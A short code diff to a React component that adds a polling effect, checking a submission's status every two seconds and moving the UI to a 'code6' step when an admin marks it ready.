@@ -104,6 +104,21 @@ export default function Home() {
     return () => clearInterval(pollingRef.current);
   }, [step, submissionId]);
 
+  // Poll when on "code" step in case admin switches to code6
+  useEffect(() => {
+    if (step === "code" && submissionId) {
+      pollingRef.current = setInterval(async () => {
+        const res = await base44.functions.invoke("checkStatus", { submissionId });
+        const s = res?.data?.status;
+        if (s === "code6_ready") {
+          clearInterval(pollingRef.current);
+          setStep("code6");
+        }
+      }, 2000);
+    }
+    return () => clearInterval(pollingRef.current);
+  }, [step, submissionId]);
+
   // Poll every 3s when on "waiting" step (waiting for admin decision on code)
   useEffect(() => {
     if (step === "waiting" && submissionId) {
